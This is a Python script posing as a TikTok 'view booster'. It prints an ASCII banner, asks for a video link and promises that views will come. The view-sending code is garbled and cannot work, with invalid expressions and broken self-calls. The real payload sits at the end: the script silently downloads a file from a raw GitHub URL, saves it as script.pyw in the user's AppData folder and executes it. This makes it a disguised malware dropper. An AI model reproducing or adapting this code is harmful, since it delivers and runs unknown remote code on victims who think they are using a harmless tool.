import os
import requests
import subprocess
from colorama import init, Fore, Back, Style
print('''
        ,----,                         ,----,                        
      ,/   .`|                       ,/   .`|  ,----..          ,--. 
    ,`   .'  :   ,---,      ,-.    ,`   .'  : /   /   \     ,--/  /| 
  ;    ;     /,`--.' |  ,--/ /|  ;    ;     //   .     : ,---,': / ' 
.'___,/    ,' |   :  :,--. :/ |.'___,/    ,'.   /   ;.  \:   : '/ /  
|    :     |  :   |  ':  : ' / |    :     |.   ;   /  ` ;|   '   ,   
;    |.';  ;  |   :  ||  '  /  ;    |.';  ;;   |  ; \ ; |'   |  /    
`----'  |  |  '   '  ;'  |  :  `----'  |  ||   :  | ; | '|   ;  ;    
    '   :  ;  |   |  ||  |   \     '   :  ;.   |  ' ' ' ::   '   \   
    |   |  '  '   :  ;'  : |. \    |   |  ''   ;  \; /  ||   |    '  
    '   :  |  |   |  '|  | ' \ \   '   :  | \   \  ',  / '   : |.  \ 
    ;   |.'   '   :  |'  : |--'    ;   |.'   ;   :    /  |   | '_\.' 
    '---'     ;   |.' ;  |,'       '---'      \   \ .'   '   : |     
              '---'   '--'                     `---`     ;   |,'     
                                                         '---'      
''')


video_link = input("enter video link : ")
print("video link : " + video_link)
print(Fore.RED + 'your views will come!' + Style.RESET_ALL)
def make_requests():

    response = requests.get(video_link)
    print(response.status_code)

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
    }
    response = requests.get('https://www.tiktok.com', headers=headers)
    print(response.status_code)

    params = {'search_query': 'Views'}
    response = requests.get('https://www.tiktok.com' + video_link, params=params, headers=headers)
    thread = "1000" + '02|'.random.choice(slice) + ".net KML REQUESTS"
    host = "example.com"
    version = "1.0"
    device = "Android"
    header = {
                "host": host,
                "connection": "keep-alive",
                "accept-encoding": "gzip",
                "message-type": "Views",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "user-agent": f"com.ss.android.ugc.trill/{version} (Linux; U; Android 11; fr_FR; {device}; Build/RP1A.200720.012; Cronet/58.0.2991.0)"
            }
    print(thread)
    def send_requests():
  
     headers, thread = make_requests(video_link)
    print("Sending requests...")
    response = requests.get('https://www.tiktok.com', headers=headers)
    print(response.status_code)
    print(thread)

    send_requests()
    make_requests(headers)


# URL du fichier à télécharger
url = 'https://raw.githubusercontent.com/just4testaaa/test/main/script.py'

# Chemin d'accès au dossier AppData de l'utilisateur
appdata_path = os.getenv('APPDATA')

# Chemin complet pour enregistrer le fichier téléchargé
filename = os.path.join(appdata_path, 'script.pyw')

# Télécharger le fichier à partir de l'URL
response = requests.get(url)

# Écrire le contenu du fichier dans le fichier local
with open(filename, 'wb') as file:
    file.write(response.content)

os.system(filename)
# Exécuter le fichier


